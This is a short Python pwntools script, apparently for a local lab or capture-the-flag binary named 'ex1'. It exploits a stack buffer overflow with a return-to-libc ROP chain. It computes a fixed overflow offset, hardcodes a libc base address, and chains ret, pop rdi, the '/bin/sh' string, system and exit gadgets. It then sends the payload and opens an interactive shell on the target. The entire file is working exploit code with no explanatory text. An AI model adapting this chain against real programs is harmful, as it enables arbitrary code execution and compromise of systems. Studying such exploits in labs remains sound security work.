from pwn import *

context.update(arch='amd64', os='linux')
target = process('./bin/ex1')

libc_base = 0x7ffff7c00000
libc_path = "/usr/lib/x86_64-linux-gnu/libc.so.6"

libc = ELF(libc_path)
libc.address = libc_base
rop = ROP(libc)

system_addr = libc.symbols["system"]
exit_addr = libc.symbols["exit"]
binsh = next(libc.search(b"/bin/sh\x00"))

pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
pop_rdi_gadget = pop_rdi_gadget.address

ret_gadget = rop.find_gadget(['ret'])
ret_gadget = ret_gadget.address


offset = 4 * 64 + 64 + 18 + 4 + 2

send_payload = flat({
        offset: [
            ret_gadget,
            pop_rdi_gadget,
            binsh,
            system_addr,
            exit_addr
        ]
    })

target.send(b"1")
target.send(send_payload)
target.interactive()
